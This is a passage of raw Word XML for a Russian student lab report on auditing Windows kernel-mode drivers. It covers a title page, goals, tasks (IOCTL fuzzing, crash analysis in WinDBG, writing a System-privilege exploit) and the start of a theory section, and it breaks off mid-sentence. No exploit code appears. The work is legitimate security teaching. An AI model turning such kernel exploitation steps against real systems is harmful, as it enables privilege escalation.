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7C2497" w14:textId="16D0E639" w:rsidR="00C53ADA" w:rsidRPr="006A0481" w:rsidRDefault="00C53ADA" w:rsidP="004D6D91">
      <w:pPr>
        <w:pStyle w:val="afff6"/>
      </w:pPr>
      <w:r w:rsidRPr="006A0481">
        <w:t xml:space="preserve">Министерство </w:t>
      </w:r>
      <w:r w:rsidR="00F133D8">
        <w:t>науки</w:t>
      </w:r>
      <w:r w:rsidRPr="006A0481">
        <w:t xml:space="preserve"> и </w:t>
      </w:r>
      <w:r w:rsidR="00F133D8">
        <w:t>высшего образования</w:t>
      </w:r>
      <w:r w:rsidRPr="006A0481">
        <w:t xml:space="preserve"> Российской Федерации</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25948FE5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Санкт-Петербургский </w:t>
      </w:r>
      <w:r w:rsidR="00C6615B">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>П</w:t>
      </w:r>
      <w:r w:rsidRPr="006A0481">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">олитехнический </w:t>
      </w:r>
      <w:r w:rsidR="00C6615B">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>У</w:t>
      </w:r>
      <w:r w:rsidRPr="006A0481">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>ниверситет</w:t>
      </w:r>
      <w:r w:rsidR="00FF6364" w:rsidRPr="00FF6364">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> Петра Великого</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F611244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>—</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A069EE2" w14:textId="3BF01232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Институт </w:t>
      </w:r>
      <w:r w:rsidR="00F133D8">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>компьютерных наук и кибербезопасности</w:t>
      </w:r>
      <w:r w:rsidRPr="006A0481">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B0A1852" w14:textId="77777777" w:rsidR="00C53ADA" w:rsidRDefault="00C53ADA" w:rsidP="00D335CB">
      <w:pPr>
        <w:pStyle w:val="afffd"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5D53E1EC" w14:textId="77777777" w:rsidR="006E2B77" w:rsidRPr="00B57B60" w:rsidRDefault="006E2B77" w:rsidP="00C53ADA">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="760EF64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70B9A1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3239ED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891EF0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18AE317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836A825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23DD7586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1F2669B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4B5702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4031450" w14:textId="3A447CA5" w:rsidR="002632D6" w:rsidRPr="00524FB3" w:rsidRDefault="002632D6" w:rsidP="002632D6">
      <w:pPr>
        <w:pStyle w:val="afff3"/>
        <w:outlineLvl w:val="0"/>
        <w:rPr>
          <w:caps/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D335CB">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">ЛАБОРАТОРНАЯ РАБОТА № </w:t>
      </w:r>
      <w:r w:rsidR="0036219A" w:rsidRPr="00524FB3">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="652F2012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5BEE38AA" w14:textId="4AC98C29" w:rsidR="00601F8B" w:rsidRPr="00601F8B" w:rsidRDefault="00FB359E" w:rsidP="004D6D91">
      <w:pPr>
        <w:pStyle w:val="afff5"/>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006A0481">
        <w:t>«</w:t>
      </w:r>
      <w:r w:rsidR="0036219A" w:rsidRPr="0036219A">
        <w:t>Аудит безопасности драйверов режима ядра ОС Windows</w:t>
      </w:r>
      <w:r w:rsidRPr="006A0481">
        <w:t>»</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D00C1B3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0113D81B" w14:textId="3FAC26F3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F133D8">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Методы безопасности компьютерных систем</w:t>
      </w:r>
      <w:r w:rsidRPr="006A0481">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>»</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="715642BF" w14:textId="77777777" w:rsidR="00C53ADA" w:rsidRDefault="00C53ADA" w:rsidP="00C53ADA"/>
    <w:p w14:paraId="154B8969" w14:textId="77777777" w:rsidR="00C53ADA" w:rsidRDefault="00C53ADA" w:rsidP="00C53ADA"/>
    <w:p w14:paraId="0DE32F14" w14:textId="77777777" w:rsidR="00830F2D" w:rsidRDefault="00830F2D" w:rsidP="00C53ADA"/>
    <w:p w14:paraId="5F91D301" w14:textId="77777777" w:rsidR="00830F2D" w:rsidRDefault="00830F2D" w:rsidP="00111FF9">
      <w:pPr>
        <w:ind w:firstLine="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7858A4CD" w14:textId="77777777" w:rsidR="00830F2D" w:rsidRDefault="00830F2D" w:rsidP="00C53ADA"/>
    <w:p w14:paraId="7BB74BB3" w14:textId="77777777" w:rsidR="00C53ADA" w:rsidRPr="00B57B60" w:rsidRDefault="00C53ADA" w:rsidP="00111FF9">
      <w:pPr>
        <w:pStyle w:val="a"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r w:rsidRPr="00B57B60">
        <w:t>Выполнил</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41DFFC5A" w14:textId="3CB12065" w:rsidR="00C53ADA" w:rsidRPr="00B57B60" w:rsidRDefault="00961BBB" w:rsidP="00111FF9">
      <w:pPr>
        <w:pStyle w:val="a"/>
      </w:pPr>
      <w:r>
        <w:t>студент гр.</w:t>
      </w:r>
      <w:r w:rsidRPr="003F274E">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="0085668E">
        <w:t>51</w:t>
      </w:r>
      <w:r w:rsidR="003F274E">
        <w:t>51004</w:t>
      </w:r>
      <w:r w:rsidR="003F274E" w:rsidRPr="003F274E">
        <w:t>/</w:t>
      </w:r>
      <w:r w:rsidR="003F274E">
        <w:t>10</w:t>
      </w:r>
      <w:r w:rsidR="0085668E">
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidR="003F274E">
        <w:t>01</w:t>
      </w:r>
      <w:r w:rsidR="00111FF9">
        <w:t xml:space="preserve">                                                          </w:t>
      </w:r>
      <w:r w:rsidR="003F274E">
        <w:t>Веремейчук Я.Ю.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48E0D8F1" w14:textId="77777777" w:rsidR="00C53ADA" w:rsidRPr="00B57B60" w:rsidRDefault="00C53ADA" w:rsidP="00025991">
      <w:pPr>
        <w:pStyle w:val="41"/>
      </w:pPr>
      <w:r w:rsidRPr="00B57B60">
        <w:t>&lt;подпись&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74EF83FE" w14:textId="77777777" w:rsidR="000F71FD" w:rsidRDefault="000F71FD" w:rsidP="003C218B">
      <w:pPr>
        <w:pStyle w:val="af6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23A79D70" w14:textId="14E47D8C" w:rsidR="00C53ADA" w:rsidRPr="00B57B60" w:rsidRDefault="00F133D8" w:rsidP="00111FF9">
      <w:pPr>
        <w:pStyle w:val="a"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Проверил</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="704F9665" w14:textId="7EECF198" w:rsidR="00C53ADA" w:rsidRPr="00B57B60" w:rsidRDefault="00F133D8" w:rsidP="00111FF9">
      <w:pPr>
        <w:pStyle w:val="a"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>п</w:t>
      </w:r>
      <w:r w:rsidR="00C93DCC" w:rsidRPr="00C93DCC">
        <w:t>реподавател</w:t>
      </w:r>
      <w:r>
        <w:t>ь</w:t>
      </w:r>
      <w:r w:rsidR="00C53ADA" w:rsidRPr="00B57B60">
        <w:tab/>
      </w:r>
      <w:r w:rsidR="00111FF9">
        <w:t xml:space="preserve">                                                              </w:t>
      </w:r>
      <w:r w:rsidR="00C53ADA" w:rsidRPr="00B57B60">
        <w:tab/>
      </w:r>
      <w:r w:rsidR="00111FF9">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Овасапян Т.Д.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3849902F" w14:textId="77777777" w:rsidR="00C53ADA" w:rsidRPr="00C53ADA" w:rsidRDefault="00C53ADA" w:rsidP="00025991">
      <w:pPr>
        <w:pStyle w:val="41"/>
      </w:pPr>
      <w:r w:rsidRPr="00C53ADA">
        <w:t>&lt;подпись&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="792D3FB3" w14:textId="77777777" w:rsidR="00C53ADA" w:rsidRPr="00B57B60" w:rsidRDefault="00C53ADA" w:rsidP="00C53ADA">
      <w:pPr>
        <w:pStyle w:val="af6"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="3960"/>
          <w:tab w:val="left" w:pos="6840"/>
        </w:tabs>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:jc w:val="left"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="57F1B40E" w14:textId="77777777" w:rsidR="00C53ADA" w:rsidRPr="006A0481" w:rsidRDefault="00C53ADA" w:rsidP="00C53ADA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="4746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6E956B01" w14:textId="77777777" w:rsidR="00C53ADA" w:rsidRDefault="00C53ADA" w:rsidP="0002599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7536F11B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57CCA0C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6041CC63" w14:textId="22B1A21D" w:rsidR="00C93DCC" w:rsidRPr="00111FF9" w:rsidRDefault="00C53ADA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  <w:r w:rsidRPr="006A0481">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>20</w:t>
      </w:r>
      <w:r w:rsidR="003F274E" w:rsidRPr="003F274E">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidR="00F133D8">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="574ACBBA" w14:textId="77777777" w:rsidR="00601F8B" w:rsidRPr="00D740EB" w:rsidRDefault="00C93DCC" w:rsidP="00111FF9">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r w:rsidRPr="00D740EB">
        <w:lastRenderedPageBreak/>
        <w:t>Цель работы</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1959D66C" w14:textId="1FD921E9" w:rsidR="00C93DCC" w:rsidRDefault="0036219A" w:rsidP="0036219A">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="0" w:name="_Hlk163037521"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Изучение типовых уязвимостей в драйверах режима ядра ОС </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Windows</w:t>
      </w:r>
      <w:r w:rsidRPr="0036219A">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">и способов их эксплуатации. Освоение навыков отладки драйверов и анализа падений системы. </w:t>
      </w:r>
      <w:bookmarkEnd w:id="0"/>
    </w:p>
    <w:p w14:paraId="7AC3B045" w14:textId="77777777" w:rsidR="0036219A" w:rsidRPr="0036219A" w:rsidRDefault="0036219A" w:rsidP="0036219A">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2683BC83" w14:textId="77777777" w:rsidR="00C93DCC" w:rsidRPr="00C93DCC" w:rsidRDefault="00C93DCC" w:rsidP="00111FF9">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Постановка задачи</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71C783E5" w14:textId="15344F65" w:rsidR="0036219A" w:rsidRDefault="0036219A" w:rsidP="0036219A">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>В ходе выполнения лабораторной работы необходимо выполнить следующие действия:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E1BE1A7" w14:textId="77777777" w:rsidR="0036219A" w:rsidRDefault="0036219A" w:rsidP="0036219A">
      <w:pPr>
        <w:pStyle w:val="af6"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:spacing w:after="160" w:line="256" w:lineRule="auto"/>
        <w:ind w:left="0" w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Получить у преподавателя в соответствии со своим вариантом драйверы</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>, содержащие уязвимости различного типа.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EAC8813" w14:textId="77777777" w:rsidR="0036219A" w:rsidRDefault="0036219A" w:rsidP="0036219A">
      <w:pPr>
        <w:pStyle w:val="af6"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:spacing w:after="160" w:line="256" w:lineRule="auto"/>
        <w:ind w:left="0" w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Настроить виртуальную машину для возможности ее отладки с использованием отладчика </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>WinDBG</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0036219A">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r w:rsidRPr="0036219A">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">ОС </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Windows</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> 7 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>86 [9]. Для установки уязвимого драйвера необходимо отключить в виртуальной машине проверку цифровой подписи.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BED3AE3" w14:textId="77777777" w:rsidR="0036219A" w:rsidRDefault="0036219A" w:rsidP="0036219A">
      <w:pPr>
        <w:pStyle w:val="af6"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:spacing w:after="160" w:line="256" w:lineRule="auto"/>
        <w:ind w:left="0" w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Провести анализ исполняемого кода драйвера с помощью дизассемблера и отладчика </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>WinDBG</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">. Определить данные, необходимые для поиска уязвимостей методом </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>фаззинга</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">: имя устройства, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>IOCTL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">-коды, функции обработки </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>IOCTL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">-команд, формат входного буфера. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76F8E536" w14:textId="77777777" w:rsidR="0036219A" w:rsidRDefault="0036219A" w:rsidP="0036219A">
      <w:pPr>
        <w:pStyle w:val="af6"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:ind w:left="0" w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Разработать программу, осуществляющую фаззинг </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>IOCTL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>-обработчиков, основанный на множественных обращениях (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>DeviceIoControl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">) к уязвимому драйверу с различными входными данными. Разработанный </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>фаззер</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> должен использовать подстановку граничных значений, перебор </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>IOCTL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">-кодов, обрабатываемых драйвером, а также возможность мутации заданного буфера. Также должен реализовывать методы </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>фаззинга</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">, обеспечивающие выявление уязвимостей, присутствующих в анализируемом драйвере. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="457E4526" w14:textId="77777777" w:rsidR="0036219A" w:rsidRDefault="0036219A" w:rsidP="0036219A">
      <w:pPr>
        <w:pStyle w:val="af6"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:ind w:left="0" w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">С использованием разработанного </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>фаззера</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> выявить присутствующую в драйвере уязвимость. Определить формат входных данных, приводящих к падению системы. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="182F9873" w14:textId="77777777" w:rsidR="0036219A" w:rsidRDefault="0036219A" w:rsidP="0036219A">
      <w:pPr>
        <w:pStyle w:val="af6"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:ind w:left="0" w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Исследовать в отладчике информацию о месте падения системы (!</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>analyze</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>). В отчете привести последовательность вызовов (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>call</w:t>
      </w:r>
      <w:r w:rsidRPr="0036219A">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>stack</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>), приведшую к отказу в обслуживании системы, тип ошибки,  место падения в ассемблерном коде и другую информацию об уязвимости.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FB27293" w14:textId="74F83EDA" w:rsidR="00F133D8" w:rsidRDefault="0036219A" w:rsidP="0036219A">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">На основе изученного кода реализовать средство, осуществляющее эксплуатацию данной уязвимости, позволяющее выполнить произвольный код с правами </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>System</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06A98F36" w14:textId="77777777" w:rsidR="00C93DCC" w:rsidRDefault="00C93DCC" w:rsidP="00C93DCC">
      <w:pPr>
        <w:suppressAutoHyphens/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="31E7CA62" w14:textId="77777777" w:rsidR="00C93DCC" w:rsidRPr="00C93DCC" w:rsidRDefault="00C93DCC" w:rsidP="00111FF9">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Теоретические исследования</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C6E203D" w14:textId="31937A3E" w:rsidR="0085668E" w:rsidRPr="00524FB3" w:rsidRDefault="00564494" w:rsidP="0085668E">
      <w:pPr>
        <w:ind w:firstLine="708"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00564494">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Существует </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:bCs/>
        </w:rPr>
        <w:t>множество</w:t>
      </w:r>
      <w:r w:rsidRPr="00564494">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> системных механизмов, которые могут быть использованы для организации взаимодействия кода пользовательского режима с драйверами режима ядра. Самыми функциональными и наиболее часто используемыми являются те механизмы, которые представляются диспетчером ввода-вывода. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="174BAE01" w14:textId="34DA30EB" w:rsidR="00564494" w:rsidRPr="00524FB3" w:rsidRDefault="00564494" w:rsidP="0085668E">
      <w:pPr>
        <w:ind w:firstLine="708"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00564494">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:bCs/>
        </w:rPr>
        <w:t>Коды управления вводом-выводом (IOCTL) используются для взаимодействия между приложениями пользовательского режима и драйверами или для внутреннего взаимодействия между драйверами в стеке. Коды управления вводом-выводом отправляются с помощью IRP.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EBF6672" w14:textId="53CF0AD8" w:rsidR="00564494" w:rsidRPr="00524FB3" w:rsidRDefault="00564494" w:rsidP="0085668E">
      <w:pPr>
        <w:ind w:firstLine="708"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00564494">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Для обработки обращений к созданным устройствам драйвер ассоциирует со своим объектом набор функций-обработчиков. Эти функции вызываются диспетчером ввода-вывода при выполнении определённых операций с устройством (открытие, закрытие, чтение, запись и т.д.), а также в случае некоторых системных событий (например, завершения работы системы или монтирования раздела жесткого диска). Структура, описывающая объект «драйвер», называется DRIVER_OBJECT, а эти функции – IRP (I/O </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00564494">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:bCs/>
        </w:rPr>
        <w:t>Request</w:t>
      </w:r>
